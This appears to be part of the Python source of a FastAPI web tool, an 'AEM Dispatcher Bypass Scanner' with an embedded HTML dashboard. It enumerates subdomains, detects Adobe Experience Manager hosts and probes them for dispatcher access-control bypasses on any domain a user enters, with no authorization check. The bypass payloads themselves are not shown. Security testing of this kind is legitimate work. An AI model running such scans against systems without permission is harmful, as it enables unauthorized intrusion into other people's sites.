            _send_ws(scan, {
                "type": "progress",
                "phase": 4,
                "current": progress_count,
                "total": total_reqs,
                "message": f"Probed {progress_count}/{total_reqs} ({progress_count * 100 // total_reqs}%)",
            })

        with rem_lock:
            host_remaining[base] -= 1

    # --- Flat pool execution ---
    with ThreadPoolExecutor(max_workers=scan.threads) as pool:
        futs = [
            pool.submit(_worker, base, url_path, tag, ep_label)
            for base, url_path, tag, ep_label in work
        ]
        for f in as_completed(futs):
            pass

    # --- Build summary ---
    vuln_hosts = [h for h in aem_targets if host_hits.get(h)]
    by_bypass: dict[str, int] = defaultdict(int)
    by_endpoint: dict[str, int] = defaultdict(int)
    for v in scan.vulnerabilities:
        by_bypass[v["bypass"]] += 1
        by_endpoint[v["endpoint"]] += 1

    scan.vulnerability_summary = {
        "total_hosts_scanned": len(aem_targets),
        "vulnerable_hosts": len(vuln_hosts),
        "total_vulnerabilities": len(scan.vulnerabilities),
        "total_requests": total_reqs,
        "by_bypass": dict(by_bypass),
        "by_endpoint": dict(by_endpoint),
        "vulnerable_host_list": vuln_hosts,
    }

    _send_ws(scan, {
        "type": "phase",
        "phase": 4,
        "name": "Bypass Scan",
        "status": "complete",
        "vulnerable_hosts": len(vuln_hosts),
        "total_hits": len(scan.vulnerabilities),
    })
    log.info(
        "Phase 4 complete: %d vulnerable hosts, %d hits",
        len(vuln_hosts),
        len(scan.vulnerabilities),
    )


# ============================================================================
# SCAN ORCHESTRATOR
# ============================================================================
def run_scan(scan: ScanState) -> None:
    """Execute all 4 phases sequentially in a background thread."""
    scan.started_at = time.time()
    scan.status = "running"

    # Determine starting phase (for continue-from-phase support)
    start_phase = getattr(scan, '_start_phase', 1)

    try:
        # ── Phase 1: Subdomain Enumeration ──
        if start_phase <= 1:
            if scan.domain and not scan.urls:
                phase1_subdomains(scan)
                if scan.cancelled:
                    scan.status = "cancelled"
                    return
            elif scan.urls:
                # Direct URL mode: skip subfinder, populate alive hosts directly
                scan.alive_hosts = [u for u in (normalize_url(u) for u in scan.urls) if u]
                _send_ws(scan, {
                    "type": "phase",
                    "phase": 1,
                    "name": "Subdomain Enumeration",
                    "status": "skipped",
                    "message": f"Using {len(scan.alive_hosts)} provided URLs directly",
                })
        else:
            _send_ws(scan, {
                "type": "phase",
                "phase": 1,
                "name": "Subdomain Enumeration",
                "status": "skipped",
                "message": f"Skipped (starting from phase {start_phase})",
            })

        # ── Phase 2: Alive Check ──
        if start_phase <= 2:
            if start_phase == 2 and scan.alive_hosts:
                # Pre-populated from upload — skip alive check, just notify
                _send_ws(scan, {
                    "type": "phase",
                    "phase": 2,
                    "name": "Alive Check",
                    "status": "skipped",
                    "message": f"Using {len(scan.alive_hosts)} uploaded alive hosts",
                })
                # Send host_found for each so the UI populates
                for host in scan.alive_hosts:
                    _send_ws(scan, {
                        "type": "host_found",
                        "host": host,
                        "status_code": 0,
                    })
            elif scan.domain and scan.subdomains:
                phase2_alive(scan)
                if scan.cancelled:
                    scan.status = "cancelled"
                    return
            elif not scan.alive_hosts:
                # Fallback: treat subdomains as alive
                scan.alive_hosts = [
                    u
                    for u in (normalize_url(s) for s in scan.subdomains)
                    if u
                ]
        else:
            _send_ws(scan, {
                "type": "phase",
                "phase": 2,
                "name": "Alive Check",
                "status": "skipped",
                "message": f"Skipped (starting from phase {start_phase})",
            })

        if not scan.alive_hosts:
            scan.status = "complete"
            scan.phase = ScanPhase.COMPLETE
            _send_ws(scan, {
                "type": "scan_complete",
                "summary": {"error": "No alive hosts found"},
            })
            return

        # ── Phase 3: AEM Detection ──
        if start_phase <= 3:
            if start_phase == 3 and scan.alive_hosts:
                # Already have alive hosts from upload — send counts
                _send_ws(scan, {
                    "type": "progress",
                    "phase": 2,
                    "counts": {"alive": len(scan.alive_hosts)},
                })
            phase3_aem_detect(scan)
            if scan.cancelled:
                scan.status = "cancelled"
                return
        else:
            _send_ws(scan, {
                "type": "phase",
                "phase": 3,
                "name": "AEM Detection",
                "status": "skipped",
                "message": f"Skipped (starting from phase {start_phase})",
            })

        # ── Phase 4: Bypass Scan ──
        if start_phase <= 4:
            if start_phase == 4 and scan.aem_hosts:
                # Pre-populated AEM hosts from upload — notify each
                for host, info in scan.aem_hosts.items():
                    _send_ws(scan, {
                        "type": "aem_detected",
                        "host": host,
                        "confidence": info.get("confidence", "confirmed"),
                        "score": info.get("score", 0),
                        "reasons": info.get("reasons", []),
                    })
            phase4_bypass(scan)
            if scan.cancelled:
                scan.status = "cancelled"
                return

        scan.status = "complete"
        scan.phase = ScanPhase.COMPLETE
        scan.finished_at = time.time()

        elapsed = scan.finished_at - scan.started_at
        _send_ws(scan, {
            "type": "scan_complete",
            "summary": {
                "scan_id": scan.scan_id,
                "elapsed_seconds": round(elapsed, 1),
                "domain": scan.domain,
                "subdomains_found": len(scan.subdomains),
                "alive_hosts": len(scan.alive_hosts),
                "aem_confirmed": sum(
                    1
                    for v in scan.aem_hosts.values()
                    if v["confidence"] == "confirmed"
                ),
                "aem_suspected": sum(
                    1
                    for v in scan.aem_hosts.values()
                    if v["confidence"] == "suspected"
                ),
                "vulnerabilities": len(scan.vulnerabilities),
                "vulnerability_summary": scan.vulnerability_summary,
            },
        })
        log.info("Scan %s complete in %.1fs", scan.scan_id, elapsed)

    except Exception as e:
        scan.status = "error"
        scan.phase = ScanPhase.ERROR
        scan.finished_at = time.time()
        log.exception("Scan %s failed: %s", scan.scan_id, e)
        _send_ws(scan, {
            "type": "scan_complete",
            "summary": {"error": str(e)},
        })
    finally:
        # Signal the WS dispatcher to stop
        _send_ws(scan, None)


# ============================================================================
# FASTAPI APP
# ============================================================================
app = FastAPI(
    title="AEM Dispatcher Bypass Scanner",
    version="2.0.0",
    description="Real-time AEM Dispatcher bypass detection with WebSocket updates",
)


class ScanRequest(BaseModel):
    domain: str | None = None
    url: str | None = None
    urls: list[str] | None = None
    threads: int = DEFAULT_THREADS
    per_host_concurrency: int = DEFAULT_PER_HOST
    timeout: int = DEFAULT_TIMEOUT
    bypass_mode: str = "full"
    # Continue-from-phase support
    start_phase: int = 1          # 1=subdomains, 2=alive, 3=aem, 4=bypass
    uploaded_hosts: list[str] | None = None  # pre-populated host list for the start_phase


@app.post("/api/scan")
async def start_scan(req: ScanRequest) -> JSONResponse:
    """Start a new scan. Accepts domain, single url, or url list.
    Supports continue-from-phase via start_phase + uploaded_hosts.
    """
    # For continue-from-phase, uploaded_hosts is enough (no domain needed)
    if not req.domain and not req.url and not req.urls and not req.uploaded_hosts:
        raise HTTPException(
            status_code=400,
            detail="Provide 'domain', 'url', 'urls', or 'uploaded_hosts' in request body",
        )

    scan_id = uuid.uuid4().hex[:12]
    scan = ScanState(
        scan_id=scan_id,
        threads=max(1, min(req.threads, 500)),
        per_host=max(1, min(req.per_host_concurrency, 50)),
        timeout=max(3, min(req.timeout, 30)),
        bypass_mode=req.bypass_mode,
    )

    if req.domain:
        scan.domain = req.domain.strip().lower()
    if req.url:
        scan.urls = [req.url.strip()]
    if req.urls:
        scan.urls = [u.strip() for u in req.urls if u.strip()]

    # ── Continue-from-phase: pre-populate data ──
    start_phase = max(1, min(req.start_phase, 4))
    scan._start_phase = start_phase

    if req.uploaded_hosts and start_phase >= 2:
        clean_hosts = [h.strip() for h in req.uploaded_hosts if h.strip()]
        if start_phase == 2:
            # Uploaded list = subdomains → run alive check on them
            scan.subdomains = clean_hosts
        elif start_phase == 3:
            # Uploaded list = alive hosts → run AEM detection on them
            scan.alive_hosts = [normalize_url(h) or h for h in clean_hosts]
        elif start_phase == 4:
            # Uploaded list = AEM hosts → run bypass scan on them
            scan.alive_hosts = [normalize_url(h) or h for h in clean_hosts]
            scan.aem_hosts = {
                (normalize_url(h) or h): {
                    "confidence": "confirmed",
                    "score": 0,
                    "reasons": ["uploaded"],
                }
                for h in clean_hosts
            }

    # Set up async message queue for WS dispatch
    loop = asyncio.get_event_loop()
    scan._loop = loop
    scan._msg_queue = asyncio.Queue()

    with scans_lock:
        scans[scan_id] = scan

    # Start WS dispatcher task
    asyncio.ensure_future(_ws_dispatcher(scan))

    # Run scan in background thread
    thread = threading.Thread(
        target=run_scan, args=(scan,), name=f"scan-{scan_id}", daemon=True
    )
    thread.start()

    return JSONResponse(
        status_code=202,
        content={
            "scan_id": scan_id,
            "status": "started",
            "start_phase": start_phase,
            "ws_url": f"/ws/{scan_id}",
            "status_url": f"/api/scan/{scan_id}/status",
            "results_url": f"/api/scan/{scan_id}/results",
        },
    )


@app.get("/api/scan/{scan_id}/status")
async def scan_status(scan_id: str) -> JSONResponse:
    """Get current scan status."""
    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    elapsed = 0.0
    if scan.started_at:
        end = scan.finished_at if scan.finished_at else time.time()
        elapsed = round(end - scan.started_at, 1)

    return JSONResponse({
        "scan_id": scan_id,
        "status": scan.status,
        "phase": scan.phase.value,
        "elapsed_seconds": elapsed,
        "subdomains_found": len(scan.subdomains),
        "alive_hosts": len(scan.alive_hosts),
        "aem_hosts_detected": len(
            [v for v in scan.aem_hosts.values() if v["confidence"] in ("confirmed", "suspected")]
        ),
        "vulnerabilities_found": len(scan.vulnerabilities),
    })


@app.get("/api/scan/{scan_id}/results")
async def scan_results(scan_id: str) -> JSONResponse:
    """Get full scan results."""
    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    elapsed = 0.0
    if scan.started_at:
        end = scan.finished_at if scan.finished_at else time.time()
        elapsed = round(end - scan.started_at, 1)

    return JSONResponse({
        "scan_id": scan_id,
        "status": scan.status,
        "phase": scan.phase.value,
        "elapsed_seconds": elapsed,
        "domain": scan.domain,
        "subdomains": scan.subdomains,
        "alive_hosts": scan.alive_hosts,
        "aem_hosts": scan.aem_hosts,
        "vulnerabilities": scan.vulnerabilities,
        "summary": scan.vulnerability_summary,
    })


@app.post("/api/scan/{scan_id}/cancel")
async def cancel_scan(scan_id: str) -> JSONResponse:
    """Cancel a running scan."""
    with scans_lock:
        scan = scans.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    scan.cancelled = True
    return JSONResponse({"scan_id": scan_id, "status": "cancelling"})


@app.delete("/api/scan/{scan_id}")
async def delete_scan(scan_id: str) -> JSONResponse:
    """Delete a scan from the registry."""
    with scans_lock:
        scan = scans.get(scan_id)
        if not scan:
            raise HTTPException(status_code=404, detail="Scan not found")
        # Cancel if still running
        scan.cancelled = True
        # Close WebSocket connections
        with scan.ws_lock:
            for ws in list(scan.ws_connections):
                try:
                    asyncio.ensure_future(ws.close(code=4001, reason="Scan deleted"))
                except Exception:
                    pass
            scan.ws_connections.clear()
        del scans[scan_id]
    return JSONResponse({"scan_id": scan_id, "deleted": True})


@app.get("/api/scans")
async def list_scans() -> JSONResponse:
    """List all scans with rich metadata for the dashboard."""
    with scans_lock:
        result = []
        for sid, s in scans.items():
            elapsed = 0.0
            if s.started_at:
                end = s.finished_at if s.finished_at else time.time()
                elapsed = round(end - s.started_at, 1)
            confirmed = sum(1 for v in s.aem_hosts.values() if v.get("confidence") == "confirmed")
            suspected = sum(1 for v in s.aem_hosts.values() if v.get("confidence") == "suspected")
            result.append({
                "scan_id": sid,
                "status": s.status,
                "phase": s.phase.value,
                "domain": s.domain or (s.urls[0] if s.urls else "—"),
                "started_at": s.started_at,
                "finished_at": s.finished_at,
                "elapsed": elapsed,
                "subdomains": len(s.subdomains),
                "alive": len(s.alive_hosts),
                "aem_confirmed": confirmed,
                "aem_suspected": suspected,
                "aem_total": confirmed + suspected,
                "vulnerabilities": len(s.vulnerabilities),
            })
        # Sort newest first
        result.sort(key=lambda x: x["started_at"] or 0, reverse=True)
    return JSONResponse(result)


# ============================================================================
# WEBSOCKET
# ============================================================================
@app.websocket("/ws/{scan_id}")
async def websocket_endpoint(websocket: WebSocket, scan_id: str) -> None:
    """WebSocket endpoint for real-time scan updates."""
    with scans_lock:
        scan = scans.get(scan_id)

    if not scan:
        await websocket.close(code=4004, reason="Scan not found")
        return

    await websocket.accept()

    with scan.ws_lock:
        scan.ws_connections.append(websocket)

    # Send current status immediately
    await websocket.send_json({
        "type": "connected",
        "scan_id": scan_id,
        "status": scan.status,
        "phase": scan.phase.value,
    })

    # Replay log history so late connections see all past messages
    with scan._log_history_lock:
        history = list(scan._log_history)
    for hist_msg in history:
        try:
            replay = {**hist_msg, "replay": True}
            await websocket.send_json(replay)
        except Exception:
            break

    try:
        while True:
            # Keep connection alive; client can send pings
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_json({"type": "pong"})
    except WebSocketDisconnect:
        pass
    finally:
        with scan.ws_lock:
            if websocket in scan.ws_connections:
                scan.ws_connections.remove(websocket)


# ============================================================================
# FRONTEND (SELF-CONTAINED)
# ============================================================================
FRONTEND_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AEM Dispatcher Bypass Scanner</title>
<style>
  :root {
    --bg: #0a0e17;
    --surface: #111827;
    --surface2: #1a2332;
    --border: #1e293b;
    --text: #e2e8f0;
    --text-dim: #64748b;
    --accent: #3b82f6;
    --green: #22c55e;
    --yellow: #eab308;
    --red: #ef4444;
    --orange: #f97316;
    --purple: #a855f7;
    --cyan: #06b6d4;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    padding: 20px;
  }
  .header {
    text-align: center;
    padding: 30px 0 20px;
    border-bottom: 1px solid var(--border);
    margin-bottom: 24px;
  }
  .header h1 {
    font-size: 1.6rem;
    color: var(--cyan);
    letter-spacing: 2px;
  }
  .header .sub {
    color: var(--text-dim);
    font-size: 0.75rem;
    margin-top: 4px;
  }
  .input-section {
    max-width: 720px;
    margin: 0 auto 24px;
    display: flex;
    gap: 10px;
  }
  .input-section input {
    flex: 1;
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 12px 16px;
    font-family: inherit;
    font-size: 0.9rem;
    border-radius: 6px;
    outline: none;
    transition: border-color 0.2s;
  }
  .input-section input:focus { border-color: var(--accent); }
  .input-section input::placeholder { color: var(--text-dim); }
  .btn {
    background: var(--accent);
    color: white;
    border: none;
    padding: 12px 24px;
    font-family: inherit;
    font-size: 0.85rem;
    font-weight: 600;
    border-radius: 6px;
    cursor: pointer;
    white-space: nowrap;
    transition: opacity 0.2s;
  }
  .btn:hover { opacity: 0.85; }
  .btn:disabled { opacity: 0.4; cursor: not-allowed; }
  .btn-cancel {
    background: var(--red);
    padding: 12px 18px;
  }
  .phases {
    max-width: 900px;
    margin: 0 auto 20px;
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
  }
  .phase-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 14px;
    text-align: center;
  }
  .phase-card .num {
    font-size: 1.4rem;
    font-weight: 700;
    color: var(--text-dim);
  }
  .phase-card .label {
    font-size: 0.7rem;
    color: var(--text-dim);
    margin-top: 4px;
  }
  .phase-card .value {
    font-size: 1.1rem;
    font-weight: 600;
    margin-top: 6px;
    color: var(--text-dim);
  }
  .phase-card.active { border-color: var(--accent); }
  .phase-card.active .num { color: var(--accent); }
  .phase-card.done { border-color: var(--green); }
  .phase-card.done .num { color: var(--green); }
  .phase-card.done .value { color: var(--green); }
  .progress-bar-container {
    max-width: 900px;
    margin: 0 auto 20px;
    background: var(--surface);
    border-radius: 6px;
    overflow: hidden;
    height: 28px;
    position: relative;
    display: none;
  }
  .progress-bar-container.visible { display: block; }
  .progress-bar-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--accent), var(--cyan));
    transition: width 0.3s ease;
    width: 0%;
  }
  .progress-bar-text {
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.7rem;
    color: white;
    text-shadow: 0 1px 2px rgba(0,0,0,0.5);
  }
  .results-grid {
    max-width: 1200px;
    margin: 0 auto;
    display: grid;
    gap: 16px;
  }
  .section {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
  }
  .section h3 {
    font-size: 0.85rem;
    color: var(--cyan);
    margin-bottom: 10px;
    letter-spacing: 1px;
  }
  .log-area {
    max-height: 320px;
    overflow-y: auto;
    font-size: 0.75rem;
    line-height: 1.7;
  }
  .log-entry {
    padding: 2px 0;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: flex-start;
    gap: 8px;
    flex-wrap: wrap;
  }
  .log-entry:last-child { border-bottom: none; }
  .tag {
    display: inline-block;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 0.65rem;
    font-weight: 600;
    flex-shrink: 0;
  }
  .tag-confirmed { background: rgba(34,197,94,0.15); color: var(--green); }
  .tag-suspected { background: rgba(234,179,8,0.15); color: var(--yellow); }
  .tag-vuln { background: rgba(239,68,68,0.15); color: var(--red); }
  .tag-bypass { background: rgba(168,85,247,0.15); color: var(--purple); }
  .tag-info { background: rgba(59,130,246,0.1); color: var(--accent); }
  .host { color: var(--cyan); }
  .dim { color: var(--text-dim); }
  .vuln-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.72rem;
  }
  .vuln-table th {
    text-align: left;
    padding: 8px 6px;
    color: var(--text-dim);
    border-bottom: 1px solid var(--border);
    font-weight: 500;
    white-space: nowrap;
  }
  .vuln-table td {
    padding: 6px;
    border-bottom: 1px solid var(--border);
    word-break: break-all;
  }
  .vuln-table tr:hover { background: var(--surface2); }
  .summary-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
    gap: 12px;
  }
  .stat-card {
    background: var(--surface2);
    border-radius: 6px;
    padding: 14px;
    text-align: center;
  }
  .stat-card .val {
    font-size: 1.8rem;
    font-weight: 700;
  }
  .stat-card .lbl {
    font-size: 0.65rem;
    color: var(--text-dim);
    margin-top: 4px;
  }
  .stat-green .val { color: var(--green); }
  .stat-red .val { color: var(--red); }
  .stat-yellow .val { color: var(--yellow); }
  .stat-blue .val { color: var(--accent); }
  .stat-cyan .val { color: var(--cyan); }
  @media (max-width: 700px) {
    .phases { grid-template-columns: repeat(2, 1fr); }
    .input-section { flex-direction: column; }
  }
</style>
</head>
<body>
<div class="header">
  <h1>AEM DISPATCHER BYPASS SCANNER</h1>
  <div class="sub">subfinder &rarr; httpx &rarr; AEM-Detect &rarr; Bypass-Scan &nbsp;|&nbsp; ref: SL Cyber / infosec_au / Muhammad Waseem</div>
</div>

<div class="input-section">
  <input type="text" id="targetInput" placeholder="Enter domain (e.g. intel.com) or URL (https://target.com)">
  <button class="btn" id="scanBtn" onclick="startScan()">SCAN</button>
  <button class="btn btn-cancel" id="cancelBtn" onclick="cancelScan()" style="display:none">CANCEL</button>
</div>

<div class="phases" id="phases">
  <div class="phase-card" id="phase1">
    <div class="num">1</div>
    <div class="label">SUBDOMAINS</div>
    <div class="value" id="p1val">--</div>
  </div>
  <div class="phase-card" id="phase2">
    <div class="num">2</div>
    <div class="label">ALIVE HOSTS</div>
    <div class="value" id="p2val">--</div>
  </div>
  <div class="phase-card" id="phase3">
    <div class="num">3</div>
    <div class="label">AEM DETECTED</div>
    <div class="value" id="p3val">--</div>
  </div>
  <div class="phase-card" id="phase4">
    <div class="num">4</div>
    <div class="label">VULNS FOUND</div>
    <div class="value" id="p4val">--</div>
  </div>
</div>

<div class="progress-bar-container" id="progressBar">
  <div class="progress-bar-fill" id="progressFill"></div>
  <div class="progress-bar-text" id="progressText"></div>
</div>

<div class="results-grid" id="results" style="display:none">
  <div class="section" id="summarySection" style="display:none">
    <h3>SCAN SUMMARY</h3>
    <div class="summary-grid" id="summaryGrid"></div>
  </div>

  <div class="section" id="vulnSection" style="display:none">
    <h3>VULNERABILITIES</h3>
    <table class="vuln-table">
      <thead>
        <tr>
          <th>Host</th>
          <th>Endpoint</th>
          <th>Bypass</th>
          <th>Status</th>
          <th>Size</th>
          <th>Type</th>
        </tr>
      </thead>
      <tbody id="vulnBody"></tbody>
    </table>
  </div>

  <div class="section">
    <h3>AEM HOSTS</h3>
    <div class="log-area" id="aemLog"></div>
  </div>

  <div class="section">
    <h3>LIVE LOG</h3>
    <div class="log-area" id="liveLog"></div>
  </div>
</div>

<script>
let ws = null;
let currentScanId = null;
let aemCount = 0;
let vulnCount = 0;

function startScan() {
  const input = document.getElementById('targetInput').value.trim();
  if (!input) return;

  const body = {};
  if (input.startsWith('http://') || input.startsWith('https://')) {
    body.url = input;
  } else {
    body.domain = input;
  }

  document.getElementById('scanBtn').disabled = true;
  document.getElementById('cancelBtn').style.display = '';
  document.getElementById('results').style.display = 'grid';
  document.getElementById('liveLog').innerHTML = '';
  document.getElementById('aemLog').innerHTML = '';
  document.getElementById('vulnBody').innerHTML = '';
  document.getElementById('summarySection').style.display = 'none';
  document.getElementById('vulnSection').style.display = 'none';
  aemCount = 0;
  vulnCount = 0;
  resetPhases();

  fetch('/api/scan', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body),
  })
  .then(r => r.json())
  .then(data => {
    currentScanId = data.scan_id;
    connectWS(data.scan_id);
    addLog('info', 'Scan started: ' + data.scan_id);
  })
  .catch(e => {
    addLog('info', 'Error starting scan: ' + e);
    document.getElementById('scanBtn').disabled = false;
    document.getElementById('cancelBtn').style.display = 'none';
  });
}

function cancelScan() {
  if (!currentScanId) return;
  fetch('/api/scan/' + currentScanId + '/cancel', { method: 'POST' });
  addLog('info', 'Cancelling scan...');
}

function connectWS(scanId) {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  ws = new WebSocket(proto + '://' + location.host + '/ws/' + scanId);

  ws.onmessage = function(e) {
    const msg = JSON.parse(e.data);
    handleMessage(msg);
  };
  ws.onclose = function() {
    document.getElementById('scanBtn').disabled = false;
    document.getElementById('cancelBtn').style.display = 'none';
  };
  ws.onerror = function() {
    addLog('info', 'WebSocket error');
  };
}

function handleMessage(msg) {
  switch(msg.type) {
    case 'phase':
      handlePhase(msg);
      break;
    case 'progress':
      handleProgress(msg);
      break;
    case 'host_found':
      addLog('info', '<span class="host">' + esc(msg.host) + '</span> <span class="dim">' + msg.status + '</span>');
      break;
    case 'aem_detected':
      aemCount++;
      document.getElementById('p3val').textContent = aemCount;
      const cls = msg.confidence === 'confirmed' ? 'tag-confirmed' : 'tag-suspected';
      const aemEntry = '<span class="tag ' + cls + '">' + msg.confidence.toUpperCase() + '</span> '
        + '<span class="host">' + esc(msg.host) + '</span> '
        + '<span class="dim">score:' + msg.score + ' | ' + msg.reasons.slice(0,5).join(', ') + '</span>';
      document.getElementById('aemLog').innerHTML += '<div class="log-entry">' + aemEntry + '</div>';
      break;
    case 'vulnerability':
      vulnCount++;
      document.getElementById('p4val').textContent = vulnCount;
      document.getElementById('vulnSection').style.display = '';
      const row = '<tr>'
        + '<td class="host">' + esc(msg.host) + '</td>'
        + '<td>' + esc(msg.endpoint) + '</td>'
        + '<td><span class="tag tag-bypass">' + esc(msg.bypass) + '</span></td>'
        + '<td style="color:var(--green)">' + msg.status_code + '</td>'
        + '<td class="dim">' + msg.size + 'B</td>'
        + '<td class="dim">' + esc(msg.content_type || '') + '</td>'
        + '</tr>';
      document.getElementById('vulnBody').innerHTML += row;
      addLog('vuln', '<span class="tag tag-vuln">VULN</span> <span class="tag tag-bypass">' + esc(msg.bypass) + '</span> ' + esc(msg.full_url || ''));
      break;
    case 'scan_complete':
      handleComplete(msg);
      break;
    case 'connected':
      addLog('info', 'Connected to scan ' + msg.scan_id);
      break;
  }
}

function handlePhase(msg) {
  const card = document.getElementById('phase' + msg.phase);
  if (!card) return;
  if (msg.status === 'running') {
    card.className = 'phase-card active';
    showProgress(true);
  } else if (msg.status === 'complete') {
    card.className = 'phase-card done';
    if (msg.count !== undefined) {
      document.getElementById('p' + msg.phase + 'val').textContent = msg.count;
    }
    if (msg.phase === 3) {
      document.getElementById('p3val').textContent = (msg.confirmed || 0) + '/' + (msg.suspected || 0);
    }
    if (msg.phase === 4) {
      document.getElementById('p4val').textContent = msg.total_hits || vulnCount;
    }
  } else if (msg.status === 'skipped') {
    card.className = 'phase-card done';
    document.getElementById('p' + msg.phase + 'val').textContent = 'skip';
  }
  addLog('info', 'Phase ' + msg.phase + ': ' + msg.name + ' - ' + msg.status + (msg.message ? ' (' + msg.message + ')' : ''));
}

function handleProgress(msg) {
  if (msg.phase === 1) {
    document.getElementById('p1val').textContent = msg.current;
  }
  if (msg.total > 0) {
    const pct = Math.round(msg.current / msg.total * 100);
    document.getElementById('progressFill').style.width = pct + '%';
    document.getElementById('progressText').textContent = msg.message || (pct + '%');
  } else {
    document.getElementById('progressText').textContent = msg.message || '';
  }
}

function handleComplete(msg) {
  showProgress(false);
  document.getElementById('scanBtn').disabled = false;
  document.getElementById('cancelBtn').style.display = 'none';

  if (msg.summary) {
    document.getElementById('summarySection').style.display = '';
    const s = msg.summary;
    let html = '';
    if (s.elapsed_seconds !== undefined) html += statCard(s.elapsed_seconds + 's', 'Elapsed', 'stat-blue');
    if (s.subdomains_found !== undefined) html += statCard(s.subdomains_found, 'Subdomains', 'stat-cyan');
    if (s.alive_hosts !== undefined) html += statCard(s.alive_hosts, 'Alive Hosts', 'stat-cyan');
    if (s.aem_confirmed !== undefined) html += statCard(s.aem_confirmed, 'AEM Confirmed', 'stat-green');
    if (s.aem_suspected !== undefined) html += statCard(s.aem_suspected, 'AEM Suspected', 'stat-yellow');
    if (s.vulnerabilities !== undefined) html += statCard(s.vulnerabilities, 'Vulnerabilities', s.vulnerabilities > 0 ? 'stat-red' : 'stat-green');
    if (s.error) html += statCard('ERR', s.error.substring(0, 40), 'stat-red');
    document.getElementById('summaryGrid').innerHTML = html;
  }
  addLog('info', 'Scan complete');
}

function statCard(val, lbl, cls) {
  return '<div class="stat-card ' + cls + '"><div class="val">' + val + '</div><div class="lbl">' + lbl + '</div></div>';
}

function addLog(type, html) {
  const log = document.getElementById('liveLog');
  log.innerHTML += '<div class="log-entry">' + html + '</div>';
  log.scrollTop = log.scrollHeight;
}

function showProgress(visible) {
  document.getElementById('progressBar').className = 'progress-bar-container' + (visible ? ' visible' : '');
}

function resetPhases() {
  for (let i = 1; i <= 4; i++) {
    document.getElementById('phase' + i).className = 'phase-card';
    document.getElementById('p' + i + 'val').textContent = '--';
  }
  document.getElementById('progressFill').style.width = '0%';
  document.getElementById('progressText').textContent = '';
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

document.getElementById('targetInput').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') startScan();
});
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def serve_frontend() -> str:
    templates_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates", "index.html")
    if os.path.exists(templates_path):
        with open(templates_path, "r") as f:
            return f.read()
    return FRONTEND_HTML


# ============================================================================
# SHUTDOWN
# ============================================================================
@app.on_event("shutdown")
async def shutdown_event() -> None:
    """Cancel all running scans on shutdown."""
    with scans_lock:
        for scan in scans.values():
            scan.cancelled = True
    log.info("All scans cancelled on shutdown")


# ============================================================================
# MAIN
# ============================================================================
if __name__ == "__main__":
    import uvicorn

    port = int(os.environ.get("PORT", 8000))
    host = os.environ.get("HOST", "0.0.0.0")
    log.info("Starting AEM Scanner on %s:%d", host, port)
    uvicorn.run(
        "server:app",
        host=host,
        port=port,
        reload=False,
        ws_ping_interval=30,
        ws_ping_timeout=60,
        log_level="info",
    )
